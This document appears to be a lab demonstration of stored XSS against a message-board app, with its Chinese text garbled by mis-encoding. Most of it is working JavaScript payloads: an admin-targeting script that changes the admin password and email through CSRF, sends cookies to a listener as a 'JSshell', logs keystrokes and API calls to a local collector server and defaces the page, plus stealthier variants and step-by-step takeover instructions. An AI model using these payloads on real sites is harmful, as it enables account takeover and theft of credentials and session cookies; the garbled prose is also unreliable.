=== Stored XSS æ”»æ“Šæ¼”ç¤º ===

## ğŸ¯ é‡å° Admin çš„å°ˆé–€æ”»æ“Šè¼‰è·

### 1. å®Œæ•´çš„ Admin æ”»æ“Šè¼‰è·
```html
<script>
// æª¢æŸ¥ç•¶å‰ç”¨æˆ¶æ˜¯å¦ç‚º admin
function isAdmin() {
    const navContent = document.querySelector('.nav-content');
    const userLinks = document.querySelectorAll('a[href*="account"], a[href*="logout"]');
    
    // æª¢æŸ¥å°èˆªæ¬„æˆ–é é¢å…§å®¹æ˜¯å¦åŒ…å« admin ç›¸é—œä¿¡æ¯
    if (navContent && navContent.innerText.includes('admin')) return true;
    if (document.body.innerText.includes('æ­¡è¿ admin')) return true;
    if (document.title.includes('admin')) return true;
    
    return false;
}

if (isAdmin()) {
    console.log('[ATTACK] Admin detected - Launching targeted attack');
    
    // === 1. CSRF æ”»æ“Šï¼šä¿®æ”¹ Admin å¯†ç¢¼ ===
    setTimeout(() => {
        const tokenInput = document.querySelector('input[name="csrf_token"]');
        if (tokenInput) {
            fetch('/account', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'csrf_token=' + tokenInput.value + '&new_password=hacked123&email=attacker@evil.com'
            }).then(response => {
                if (response.ok) {
                    console.log('[ATTACK] Admin credentials changed successfully');
                    // ç™¼é€é€šçŸ¥åˆ°æ”»æ“Šè€…ä¼ºæœå™¨
                    new Image().src = 'http://127.0.0.1:8888/keylogger?admin_pwned=success';
                }
            }).catch(e => console.log('[ATTACK] CSRF failed:', e));
        }
    }, 3000);
    
    // === 2. JSshell åå‘é€£æ¥ (Admin å°ˆç”¨) ===
    setInterval(function(){
        with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?admin_session=".concat(document.cookie)
    }, 2000);
    
    // === 3. Admin å°ˆå±¬ Keylogger ===
    let adminKeys = '';
    document.addEventListener('keydown', function(e) {
        adminKeys += e.key;
        if (adminKeys.length >= 5 || e.key === 'Enter') {
            new Image().src = 'http://127.0.0.1:8888/keylogger?admin_keys=' + encodeURIComponent(adminKeys);
            adminKeys = '';
        }
    });
    
    // === 4. ç®¡ç†å“¡æ“ä½œç›£æ§ ===
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        // è¨˜éŒ„ admin çš„æ‰€æœ‰ API è«‹æ±‚
        new Image().src = 'http://127.0.0.1:8888/keylogger?admin_api=' + encodeURIComponent(args[0]);
        return originalFetch.apply(this, args);
    };
    
    // === 5. é é¢åŠ«æŒ ===
    setTimeout(() => {
        if (Math.random() > 0.7) { // 30% æ©Ÿç‡åŠ«æŒé é¢
            document.body.innerHTML = `
                <div style="background: #000; color: #f00; text-align: center; padding: 50px; font-family: monospace;">
                    <h1>ğŸ´â€â˜ ï¸ ADMIN ACCOUNT COMPROMISED ğŸ´â€â˜ ï¸</h1>
                    <p>Your admin credentials have been changed.</p>
                    <p>New password: hacked123</p>
                    <p>Contact: attacker@evil.com</p>
                </div>
            `;
        }
    }, 10000);
    
} else {
    console.log('[ATTACK] Regular user detected - Basic keylogger only');
    
    // æ™®é€šç”¨æˆ¶çš„ç°¡å–® Keylogger
    let keys = '';
    document.addEventListener('keydown', function(e) {
        keys += e.key;
        if (keys.length >= 10) {
            new Image().src = 'http://127.0.0.1:8888/keylogger?keys=' + encodeURIComponent(keys);
            keys = '';
        }
    });
}
</script>
```

### 2. ç°¡åŒ–ç‰ˆ Admin æ”»æ“Šè¼‰è·ï¼ˆç”¨æ–¼æ¼”ç¤ºï¼‰
```html
<script>
if(document.body.innerText.includes('admin') || document.body.innerText.includes('ç®¡ç†')) {
    // é‡å° Admin çš„ CSRF æ”»æ“Š
    fetch('/account', {
        method: 'POST', 
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'csrf_token=' + document.querySelector('input[name="csrf_token"]').value + '&new_password=hacked123'
    });
    alert('Admin å¯†ç¢¼å·²è¢«ä¿®æ”¹ç‚º hacked123ï¼');
}
</script>
```

### 3. éš±è”½ç‰ˆæ”»æ“Šè¼‰è·
```html
<script>
// æ›´éš±è”½çš„ Admin æª¢æ¸¬å’Œæ”»æ“Š
(function() {
    const u = document.body.innerText;
    const isA = u.includes('admin') || u.includes('ç®¡ç†å“¡') || document.title.includes('admin');
    
    if (isA) {
        // å»¶é²æ”»æ“Šï¼Œé¿å…è¢«ç™¼ç¾
        setTimeout(() => {
            const t = document.querySelector('input[name="csrf_token"]');
            if (t) {
                const fd = new FormData();
                fd.append('csrf_token', t.value);
                fd.append('new_password', 'hacked123');
                fd.append('email', 'pwned@hacker.com');
                
                fetch('/account', {method: 'POST', body: new URLSearchParams(fd)});
            }
        }, 5000);
    }
})();
</script>
```

### 4. æ¸¬è©¦ç”¨ç°¡å–®è¼‰è·
```html
<script>alert('å¦‚æœä½ æ˜¯ adminï¼Œä½ çš„å¯†ç¢¼å³å°‡è¢«ä¿®æ”¹ï¼');</script>
```

## æ”»æ“Šæ¸¬è©¦æ­¥é©Ÿ

### æ­¥é©Ÿ 1: æº–å‚™æ”»æ“Š
1. ä»¥æ™®é€šç”¨æˆ¶ (test/testpass) ç™»å…¥
2. åœ¨ç•™è¨€æ¿è²¼ä¸Šå®Œæ•´æ”»æ“Šè¼‰è·
3. ç•™è¨€æˆåŠŸä¿å­˜åˆ°è³‡æ–™åº«

### æ­¥é©Ÿ 2: Admin è§¸ç™¼æ”»æ“Š
1. Admin ç™»å‡º (å¦‚æœå·²ç™»å…¥)
2. ä»¥ admin/adminpass é‡æ–°ç™»å…¥
3. è¨ªå•ç•™è¨€æ¿æŸ¥çœ‹ç•™è¨€
4. æ”»æ“Šè‡ªå‹•è§¸ç™¼

### æ­¥é©Ÿ 3: é©—è­‰æ”»æ“ŠæˆåŠŸ
1. Admin ç™»å‡º
2. å˜—è©¦åŸå¯†ç¢¼ç™»å…¥: admin/adminpass âŒ
3. ä½¿ç”¨æ–°å¯†ç¢¼ç™»å…¥: admin/hacked123 âœ…
4. æª¢æŸ¥æ”»æ“Šè€…æ§åˆ¶é¢æ¿çš„è¨˜éŒ„

### æ­¥é©Ÿ 4: åˆ©ç”¨ç²å¾—çš„æ¬Šé™
1. ä»¥ admin/hacked123 ç™»å…¥
2. è¨ªå•ç®¡ç†å“¡åŠŸèƒ½
3. æŸ¥çœ‹ /admin/users å’Œ /admin/comments
4. ç²å¾—ç³»çµ±å®Œå…¨æ§åˆ¶æ¬Š

## æ”»æ“Šæ•ˆæœ

### âœ… æˆåŠŸæŒ‡æ¨™
- Admin å¯†ç¢¼è¢«ä¿®æ”¹ç‚º hacked123
- Admin éƒµç®±è¢«ä¿®æ”¹ç‚ºæ”»æ“Šè€…éƒµç®±
- JSshell å»ºç«‹å° admin ç€è¦½å™¨çš„æ§åˆ¶
- Keylogger è¨˜éŒ„ admin çš„æŒ‰éµ
- æ”»æ“Šè€…ç²å¾—ç®¡ç†å“¡æ¬Šé™

### ğŸ¯ æ”»æ“Šåƒ¹å€¼
- æ¬Šé™æå‡ï¼šå¾æ™®é€šç”¨æˆ¶åˆ°ç®¡ç†å“¡
- æ•¸æ“šè¨ªå•ï¼šå¯æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ¶å’Œç•™è¨€
- ç³»çµ±æ§åˆ¶ï¼šå®Œå…¨æ§åˆ¶ Web æ‡‰ç”¨
- æŒä¹…åŒ–ï¼šæ”»æ“Šè¼‰è·æ°¸ä¹…ä¿å­˜

æ³¨æ„ï¼šé€™ç¨®é‡å°æ€§æ”»æ“Šå±•ç¤ºäº† APT (Advanced Persistent Threat) æ”»æ“Šçš„ç‰¹é»ï¼
